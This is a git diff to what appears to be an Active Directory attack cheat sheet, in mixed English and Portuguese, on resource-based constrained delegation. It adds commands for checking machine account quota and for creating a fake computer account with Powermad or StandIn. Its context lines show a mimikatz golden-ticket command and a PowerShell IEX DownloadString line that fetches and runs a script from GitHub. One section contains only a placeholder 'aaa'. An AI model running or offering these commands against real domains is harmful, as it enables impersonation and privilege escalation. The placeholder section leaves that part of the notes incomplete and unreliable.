@@ -1496,7 +1496,9 @@ kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-312420
 
 ## RESOURCE-BASED CONSTRAINED DELEGATION
 This is similar to the basic Constrained Delegation but instead of giving permissions to an object to impersonate any user against a service. Resource-based Constrain Delegation sets in the object who is able to impersonate any user against it.
+
 In this case, the constrained object will have an attribute called msDS-AllowedToActOnBehalfOfOtherIdentity with the name of the user that can impersonate any other user against it.
+
 Another important difference from this Constrained Delegation to the other delegations is that any user with write permissions over a machine account (GenericAll/GenericWrite/WriteDacl/WriteProperty/etc) can set the msDS-AllowedToActOnBehalfOfOtherIdentity (In the other forms of Delegation you needed domain admin privs).
 
 If you have an account or computer with the constrained delegation privilege, it is possible to impersonate any other user and authenticate yourself to a service where the user is allowed to delegate.
@@ -1508,6 +1510,18 @@ Get-ADObject -Identity "DC=TECH,DC=LOCAL" -Properties MS-DS-MachineAccountQuota
 ```
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
+```
+SharpView Get-DomainObject -Domain tech.local
+```
+```
+StandIn.exe --object ms-DS-MachineAccountQuota=*
+```
+##### RESOURCE-BASED CONSTRAINED DELEGATION - FIND COMPUTERS AND USERS WITH RESOURCE-BASED CONSTRAINED DELEGATION
+```
+aaa
+```
+
+
 ##### RESOURCE-BASED CONSTRAINED DELEGATION - CRIAR CONTA FALSA DE COMPUTADOR
 CARREGAR O POWERMAD
 ```
@@ -1519,7 +1533,11 @@ IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cia
 ```
 CRIAR UMA CONTA FALSA DE COMPUTADOR
 ```
-New-MachineAccount -MachineAccount ATTACKER -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+New-MachineAccount -MachineAccount ATTACKERTMP -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+```
+OU USAR O STANDIN
+```
+StandIn.exe --computer Desktop-Pentestlab --make
 ```
 
 
